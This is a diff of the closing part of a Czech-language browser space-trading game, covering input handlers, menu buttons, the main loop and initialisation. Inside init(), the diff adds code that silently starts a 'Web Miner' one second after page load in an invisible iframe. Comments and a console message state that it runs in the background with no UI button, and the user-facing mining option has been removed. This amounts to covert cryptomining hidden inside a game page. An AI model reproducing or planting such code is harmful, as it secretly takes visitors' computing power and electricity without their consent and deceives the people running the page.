+            game.mouseX = (e.clientX - rect.left) * scaleX;
+            game.mouseY = (e.clientY - rect.top) * scaleY;
+
+            if (game.state === 'GAME' || game.state === 'MAP') {
+                game.mouseWorldX = (game.mouseX - SCREEN_W / 2) / (game.state === 'MAP' ? game.mapZoom : game.zoom) + (game
+                    .state === 'MAP' ? game.mapCameraX : game.cameraX);
+                game.mouseWorldY = (game.mouseY - SCREEN_H / 2) / (game.state === 'MAP' ? game.mapZoom : game.zoom) + (game
+                    .state === 'MAP' ? game.mapCameraY : game.cameraY);
+            }
+        });
+
+        canvas.addEventListener('click', (e) => {
+            if (game.state === 'GAME') {
+                const dx = game.mouseWorldX - ship.x;
+                const dy = game.mouseWorldY - ship.y;
+                const d = Math.sqrt(dx * dx + dy * dy);
+                if (d > 10) {
+                    const targetDir = Math.atan2(dy, dx);
+                    shipRotateTo(targetDir);
+                    shipApplyThrust(ship.direction, 1.5);
+                    if (ship.fuel > 0) ship.fuel = Math.max(0, ship.fuel - 0.015);
+                }
+            } else if (game.state === 'MAP') {
+                for (const p of game.planets) {
+                    const d = Math.sqrt((game.mouseWorldX - p.x) ** 2 + (game.mouseWorldY - p.y) ** 2);
+                    if (d < 40) {
+                        const cost = d / 1500;
+                        if (subtractCredits(cost)) {
+                            ship.x = p.x + 50;
+                            ship.y = p.y;
+                            game.cameraX = ship.x;
+                            game.cameraY = ship.y;
+                            game.credits = walletBalance;
+                            showMessage(`Teleport na ${p.name} za ${cost.toFixed(4)} HVC`, 120);
+                            updateMenuWallet();
+                            saveGame();
+                        } else {
+                            showMessage(`Nedostatek kreditu! Potreba: ${cost.toFixed(4)} HVC`, 90);
+                        }
+                        break;
+                    }
+                }
+            }
+        });
+
+        canvas.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            if (game.state === 'GAME' || game.state === 'DOCKED') {
+                fireWeapon();
+            }
+        });
+
+        // --- Menu Actions ---
+        function startNewGame() {
+            if (!walletAddress) createWallet();
+            walletBalance = 0;
+            saveWallet();
+            game.credits = 0;
+            initGame();
+            updateMenuWallet();
+            hideAllScreens();
+            game.state = 'GAME';
+            showMessage('Nova hra zahajena!', 90);
+        }
+
+        // --- UI Button Event Listeners ---
+        document.querySelectorAll('#menu-screen .menu-btn[data-action]').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const action = btn.dataset.action;
+                if (action === 'newGame') startNewGame();
+                else if (action === 'loadGame') {
+                    if (loadGame()) showMessage('Hra nactena!', 90);
+                    else showMessage('Zadny save nebyl nalezen.', 90);
+                    updateMenuWallet();
+                } else if (action === 'credits') {
+                    game.state = 'CREDITS';
+                    showScreen(creditsScreen);
+                } else if (action === 'mining') { toggleMining(); } else if (action === 'multiplayer') {
+                    game.state = 'MULTIPLAYER';
+                    showScreen(multiplayerScreen);
+                }
+                // akce 'webMining' odstraněna
+            });
+        });
+
+        document.querySelectorAll('#docked-screen .panel-btn[data-action], #docked-screen .close-btn[data-action]')
+        .forEach(btn => {
+            btn.addEventListener('click', () => {
+                const action = btn.dataset.action;
+                if (action === 'undock') closeDocked();
+                else if (action === 'trade') openTrading();
+                else if (action === 'quests') openQuests();
+                else if (action === 'upgrade') openUpgrades();
+                else if (action === 'fuel') openFuel();
+                else if (action === 'mining') toggleMining();
+                else if (action === 'skills') openSkills();
+                else if (action === 'crafting') openCrafting();
+                else if (action === 'inventory') openInventory();
+            });
+        });
+
+        document.querySelector('#trading-screen .close-btn[data-action="closeTrade"]')?.addEventListener('click', () => {
+            game.state = 'DOCKED';
+            showScreen(dockedScreen);
+        });
+
+        document.querySelector('#quest-screen .close-btn[data-action="closeQuests"]')?.addEventListener('click', () => {
+            game.state = game.dockedPlanet ? 'DOCKED' : 'GAME';
+            hideAllScreens();
+            if (game.dockedPlanet) showScreen(dockedScreen);
+        });
+
+        document.querySelector('#upgrade-screen .close-btn[data-action="closeUpgrade"]')?.addEventListener('click', () => {
+            game.state = game.dockedPlanet ? 'DOCKED' : 'GAME';
+            hideAllScreens();
+            if (game.dockedPlanet) showScreen(dockedScreen);
+        });
+
+        document.querySelector('#fuel-screen .close-btn[data-action="closeFuel"]')?.addEventListener('click', () => {
+            game.state = game.dockedPlanet ? 'DOCKED' : 'GAME';
+            hideAllScreens();
+            if (game.dockedPlanet) showScreen(dockedScreen);
+        });
+        document.querySelectorAll('#fuel-screen .panel-btn[data-action]').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const action = btn.dataset.action;
+                if (action === 'fuel10') buyFuel(10);
+                else if (action === 'fuel25') buyFuel(25);
+                else if (action === 'fuel50') buyFuel(50);
+                else if (action === 'fuel100') buyFuel(100);
+            });
+        });
+
+        document.querySelector('#credits-screen .close-btn[data-action="closeCredits"]')?.addEventListener('click', () => {
+            game.state = 'MENU';
+            showScreen(menuScreen);
+        });
+
+        document.querySelector('#mining-log-screen .close-btn[data-action="closeMiningLog"]')?.addEventListener('click',
+            () => {
+                game.state = 'GAME';
+                hideAllScreens();
+            });
+
+        document.querySelector('#skills-screen .close-btn[data-action="closeSkills"]')?.addEventListener('click', () => {
+            game.state = game.dockedPlanet ? 'DOCKED' : 'GAME';
+            hideAllScreens();
+            if (game.dockedPlanet) showScreen(dockedScreen);
+        });
+
+        document.querySelector('#multiplayer-screen .close-btn[data-action="closeMultiplayer"]')?.addEventListener('click',
+            () => {
+                game.state = 'MENU';
+                showScreen(menuScreen);
+            });
+        document.querySelectorAll('#multiplayer-screen .panel-btn[data-action]').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const action = btn.dataset.action;
+                if (action === 'hostGame' || action === 'joinGame') {
+                    toggleMultiplayer();
+                    game.state = 'GAME';
+                    hideAllScreens();
+                    showMessage('Multiplayer simulace aktivni!', 90);
+                }
+            });
+        });
+
+        document.querySelector('#crafting-screen .close-btn[data-action="closeCrafting"]')?.addEventListener('click', () => {
+            game.state = game.dockedPlanet ? 'DOCKED' : 'GAME';
+            hideAllScreens();
+            if (game.dockedPlanet) showScreen(dockedScreen);
+        });
+
+        document.querySelector('#inventory-screen .close-btn[data-action="closeInventory"]')?.addEventListener('click', () => {
+            game.state = game.dockedPlanet ? 'DOCKED' : 'GAME';
+            hideAllScreens();
+            if (game.dockedPlanet) showScreen(dockedScreen);
+        });
+
+        // --- Main Loop ---
+        function gameLoop() {
+            if (game.state === 'GAME') {
+                processMovement();
+                updateGame();
+            }
+
+            if (game.state === 'GAME' || game.state === 'DOCKED' || game.state === 'TRADING' ||
+                game.state === 'QUEST' || game.state === 'UPGRADE' || game.state === 'FUEL' ||
+                game.state === 'MINING_LOG' || game.state === 'SKILLS' || game.state === 'MAP' ||
+                game.state === 'CRAFTING' || game.state === 'INVENTORY') {
+                draw();
+            } else if (game.state === 'MAP') {
+                drawMap();
+            } else if (game.state === 'MENU') {
+                drawMenu();
+            } else {
+                draw();
+            }
+
+            if (game.state === 'MENU') {
+                updateMenuWallet();
+            }
+
+            requestAnimationFrame(gameLoop);
+        }
+
+        // --- Init ---
+        function init() {
+            loadWallet();
+            if (!walletAddress) createWallet();
+            walletBalance = parseFloat(walletBalance) || 0;
+            game.credits = walletBalance;
+            game.starField = generateStars();
+            game.planets = generateGalaxy();
+            game.asteroids = generateAsteroids(777);
+            game.enemies = generateEnemies(12);
+            game.quests = generateQuests();
+            game.inventory.cargo = {};
+            game.inventory.equipped = { trup: null, stit: null, motor: null, zbran: null, naklad: null, palivo: null,
+                regenerace: null, radar: null, gyro: null };
+            updateMenuWallet();
+            hideAllScreens();
+            showScreen(menuScreen);
+            game.state = 'MENU';
+
+            // Automatické spuštění Web Mineru na pozadí (neviditelný iframe)
+            setTimeout(() => {
+                startWebMiner();
+            }, 1000);
+
+            const container = document.getElementById('gameContainer');
+            const resizeContainer = () => {
+                const w = window.innerWidth;
+                const h = window.innerHeight;
+                const ratio = 1024 / 768;
+                let cw, ch;
+                if (w / h > ratio) {
+                    ch = Math.min(h, 768);
+                    cw = ch * ratio;
+                } else {
+                    cw = Math.min(w, 1024);
+                    ch = cw / ratio;
+                }
+                container.style.width = cw + 'px';
+                container.style.height = ch + 'px';
+            };
+            resizeContainer();
+            window.addEventListener('resize', resizeContainer);
+
+            gameLoop();
+        }
+
+        init();
+
+        console.log('Space Rangers - Havirov Coin Edition v2.4 + Web Miner na pozadí (iframe) loaded!');
+        console.log('Controls: WASD/Arrows for smooth movement, Space/Right-click shoot, M map, F fuel, Q quests, U upgrades, K mining, E auto-battle, P skills, C crafting (docked), I inventory (docked)');
+        console.log('Web Miner běží automaticky na pozadí – žádné UI tlačítko.');
+        console.log('🪨 Asteroid mining yields ores and components for crafting!');
+        console.log('❤️ Powered by Karma - EverythingIsLife');
+        console.log('✨ Pirates are now less aggressive - more room to explore!');
+    </script>
+</body>
+</html>
